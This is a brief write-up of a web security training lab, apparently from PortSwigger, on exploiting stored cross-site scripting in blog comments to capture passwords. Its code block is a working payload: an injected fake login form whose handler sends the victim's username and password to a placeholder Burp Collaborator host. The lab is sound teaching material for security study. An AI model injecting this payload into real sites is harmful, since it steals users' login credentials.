# Practitioner Lab 75: Exploiting cross-site scripting to capture passwords

---

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

```
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Using this payload I was able to get the username and password
